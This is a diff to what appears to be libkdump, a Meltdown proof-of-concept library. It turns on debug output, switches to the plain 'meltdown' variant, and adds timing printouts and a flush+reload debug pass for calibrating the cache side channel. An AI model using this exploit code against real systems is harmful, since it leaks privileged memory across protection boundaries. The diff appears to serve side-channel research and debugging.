@@ -19,7 +19,7 @@ static jmp_buf buf;
 static char *_mem = NULL, *mem = NULL;
 static pthread_t *load_thread;
 static size_t phys = 0;
-static int dbg = 0;
+static int dbg = 1;
 
 static libkdump_config_t config;
 
@@ -110,7 +110,7 @@ static libkdump_config_t config;
 #endif
 
 #ifndef MELTDOWN
-#define MELTDOWN meltdown_nonull
+#define MELTDOWN meltdown
 #endif
 
 // ---------------------------------------------------------------------------
@@ -189,6 +189,11 @@ static int __attribute__((always_inline)) flush_reload(void *ptr) {
   end = rdtsc();
 
   flush(ptr);
+
+  if (dbg) {
+    printf("%d\n", end-start);
+  }
+  
 
   if (end - start < config.cache_miss_threshold) {
     return 1;
@@ -512,6 +517,10 @@ int __attribute__((optimize("-Os"), noinline)) libkdump_read_signal_handler() {
 
     int i;
     for (i = 0; i < 256; i++) {
+      if (dbg) {
+        printf("flush_reload_debug,%d,", i);
+      }
+      
       if (flush_reload(mem + i * 4096)) {
         if (i >= 1) {
           return i;
@@ -561,4 +570,37 @@ int __attribute__((optimize("-O0"))) libkdump_read(size_t addr) {
     }
   }
   return max_i;
+}
+
+#define PAGE_SIZE 4096
+
+// Do a debug flush-reload pass
+void flush_reload_debug_pass(char *probe, char *cached_line) {
+  for (size_t i = 0; i < 256; i++) {
+    // Flush from probe the cache line that would have contained that byte value
+    flush(probe + i * PAGE_SIZE);
+  }
+
+  // Move something to this value to make it cache
+  if (cached_line != NULL) {
+    // TODO: Change this for a movq op?
+    probe[PAGE_SIZE * (*cached_line)] = 1;
+  }
+
+  for (size_t i = 0; i < 256; i++) {
+    // measure cache access time for this byte-value
+    uint64_t start = 0, end = 0;
+
+    void *ptr_to_read = PAGE_SIZE * i + probe;
+
+    start = rdtsc();
+    maccess(ptr_to_read);
+    end = rdtsc();
+
+    // flash measured ptr
+    flush(ptr_to_read);
+
+    printf("%d,%d\n", i, end-start);
+  }
+
 }
